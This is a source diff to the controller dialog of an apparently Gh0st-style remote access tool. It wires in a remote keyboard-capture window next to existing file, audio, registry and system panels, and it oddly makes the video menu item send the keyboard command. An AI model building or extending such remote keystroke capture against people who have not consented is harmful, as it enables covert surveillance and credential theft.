@@ -90,6 +90,7 @@ BEGIN_MESSAGE_MAP(CCcRemoteDlg, CDialogEx)
 	ON_MESSAGE(WM_OPENAUDIODIALOG, OnOpenAudioDialog)
 	ON_MESSAGE(WM_OPENSERVERDIALOG, OnOpenServerDialog)
 	ON_MESSAGE(WM_OPENREGEDITDIALOG, OnOpenRegEditDialog)
+	ON_MESSAGE(WM_OPENKEYBOARDDIALOG, OnOpenKeyBoardDialog)
 	
 	//-------------系统-------------
 	ON_WM_SYSCOMMAND()
@@ -585,7 +586,7 @@ void CCcRemoteDlg::OnOnlineDesktop()
 void CCcRemoteDlg::OnOnlineFile()
 {
 	// TODO: 在此添加命令处理程序代码
-	BYTE	bToken = COMMAND_LIST_DRIVE;            //在服务端中搜索COMMAND_LIST_DRIVE
+	BYTE	bToken = COMMAND_LIST_DRIVE;            //服务端中COMMAND_LIST_DRIVE
 	SendSelectCommand(&bToken, sizeof(BYTE));
 }
 
@@ -617,6 +618,8 @@ void CCcRemoteDlg::OnOnlineServer()
 void CCcRemoteDlg::OnOnlineVideo()
 {
 	// TODO: 在此添加命令处理程序代码
+	BYTE	bToken = COMMAND_KEYBOARD;
+	SendSelectCommand(&bToken, sizeof(BYTE));
 }
 
 
@@ -851,9 +854,9 @@ void CCcRemoteDlg::ProcessReceiveComplete(ClientContext *pContext)
 		case AUDIO_DLG:
 			((CAudioDlg *)dlg)->OnReceiveComplete();
 			break;
-		//case KEYBOARD_DLG:
-		//	((CKeyBoardDlg *)dlg)->OnReceiveComplete();
-		//	break;
+		case KEYBOARD_DLG:
+			((CKeyBoardDlg *)dlg)->OnReceiveComplete();
+			break;
 		case SYSTEM_DLG:
 			((CSystemDlg *)dlg)->OnReceiveComplete();
 			break;
@@ -933,6 +936,9 @@ void CCcRemoteDlg::ProcessReceiveComplete(ClientContext *pContext)
 		break;
 	case TOKEN_REGEDIT:
 		g_pCcRemoteDlg->PostMessage(WM_OPENREGEDITDIALOG, 0, (LPARAM)pContext);
+		break;
+	case TOKEN_KEYBOARD_START:
+		g_pCcRemoteDlg->PostMessage(WM_OPENKEYBOARDDIALOG, 0, (LPARAM)pContext);
 		break;
 		// 命令停止当前操作
 	default:
@@ -1088,7 +1094,7 @@ LRESULT CCcRemoteDlg::OnOpenSystemDialog(WPARAM wParam, LPARAM lParam)
 	ClientContext	*pContext = (ClientContext *)lParam;
 	CSystemDlg	*dlg = new CSystemDlg(this, m_iocpServer, pContext);  //动态创建CSystemDlg
 
-	// 设置父窗口为卓面
+	// 设置父窗口为桌面
 	dlg->Create(IDD_SYSTEM, GetDesktopWindow());      //创建对话框
 	dlg->ShowWindow(SW_SHOW);                      //显示对话框
 
@@ -1136,7 +1142,7 @@ LRESULT CCcRemoteDlg::OnOpenAudioDialog(WPARAM wParam, LPARAM lParam)
 {
 	ClientContext *pContext = (ClientContext *)lParam;
 	CAudioDlg	*dlg = new CAudioDlg(this, m_iocpServer, pContext);
-	// 设置父窗口为卓面
+	// 设置父窗口为桌面
 	dlg->Create(IDD_AUDIO, GetDesktopWindow());
 	dlg->ShowWindow(SW_SHOW);
 	pContext->m_Dialog[0] = AUDIO_DLG;
@@ -1160,7 +1166,7 @@ LRESULT CCcRemoteDlg::OnOpenServerDialog(WPARAM wParam, LPARAM lParam)
 	return 0;
 }
 
-//注册表管理窗口
+// 注册表管理窗口
 LRESULT CCcRemoteDlg::OnOpenRegEditDialog(WPARAM wParam, LPARAM lParam)
 {
 	ClientContext	*pContext = (ClientContext *)lParam;
@@ -1173,6 +1179,21 @@ LRESULT CCcRemoteDlg::OnOpenRegEditDialog(WPARAM wParam, LPARAM lParam)
 	pContext->m_Dialog[0] = REGEDIT_DLG;              //这个值用做服务端再次发送数据时的标识
 	pContext->m_Dialog[1] = (int)dlg;
 	//先看一下这个对话框的界面再看这个对话框类的构造函数
+	return 0;
+}
+
+// 键盘管理窗口
+LRESULT CCcRemoteDlg::OnOpenKeyBoardDialog(WPARAM wParam, LPARAM lParam)
+{
+	ClientContext	*pContext = (ClientContext *)lParam;
+	CKeyBoardDlg	*dlg = new CKeyBoardDlg(this, m_iocpServer, pContext);
+
+	// 设置父窗口为桌面
+	dlg->Create(IDD_KEYBOARD, GetDesktopWindow());
+	dlg->ShowWindow(SW_SHOW);
+
+	pContext->m_Dialog[0] = KEYBOARD_DLG;
+	pContext->m_Dialog[1] = (int)dlg;
 	return 0;
 }
 
